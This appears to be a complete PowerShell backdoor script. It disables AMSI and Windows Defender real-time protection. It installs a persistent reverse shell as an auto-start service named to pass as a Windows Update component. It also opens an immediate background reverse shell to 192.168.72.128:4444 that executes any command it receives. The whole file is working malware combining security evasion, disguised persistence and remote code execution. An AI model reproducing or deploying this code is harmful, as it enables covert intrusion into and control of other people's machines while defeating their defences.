$ip = "192.168.72.128"
$port = 4444

# Defender Evasion
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue

# Persistence (Service) - with better error handling
$persistDir = "C:\ProgramData\WindowsUpdate"
$payloadPath = "$persistDir\update.ps1"
$serviceName = "WindowsUpdateOrchestrator"

if (-not (Test-Path $persistDir)) {
    New-Item -Path $persistDir -ItemType Directory -Force | Out-Null
}

$payload = @'
while($true){try{$c=New-Object Net.Sockets.TCPClient("192.168.72.128",4444);$s=$c.GetStream();$w=New-Object IO.StreamWriter($s);$r=New-Object IO.StreamReader($s);$w.AutoFlush=$true;$w.WriteLine("[+] Persistent shell");$w.Write("PS> ");while($true){$cmd=$r.ReadLine();if($cmd){try{$res=iex $cmd 2>&1|Out-String;$w.Write($res)}catch{$w.WriteLine("ERR")};$w.Write("PS> ")}}catch{Start-Sleep 10}}}
'@

$payload | Out-File -FilePath $payloadPath -Encoding utf8 -Force -ErrorAction SilentlyContinue

$psExe = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
$cmd = "`"$psExe`" -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$payloadPath`""

if (Get-Service $serviceName -ErrorAction SilentlyContinue) { sc.exe delete $serviceName | Out-Null }

New-Service -Name $serviceName -DisplayName "Windows Update Orchestrator Service" -BinaryPathName $cmd -StartupType Automatic -ErrorAction SilentlyContinue | Out-Null
Start-Service $serviceName -ErrorAction SilentlyContinue

# Immediate Reverse Shell
Start-Job -ScriptBlock {
    param($i, $p)
    while($true){
        try{
            $c=New-Object Net.Sockets.TCPClient($i,$p)
            $s=$c.GetStream()
            $w=New-Object IO.StreamWriter($s)
            $r=New-Object IO.StreamReader($s)
            $w.AutoFlush=$true
            $w.WriteLine("[+] Immediate shell connected")
            $w.Write("PS> ")
            while($true){
                $cmd=$r.ReadLine()
                if($cmd){
                    try{$res=iex $cmd 2>&1|Out-String;$w.Write($res)}catch{$w.WriteLine("ERR")}
                }
                $w.Write("PS> ")
            }
        }catch{Start-Sleep 8}
    }
} -ArgumentList $ip, $port | Out-Null

Write-Host "[+] Backdoor loaded successfully" 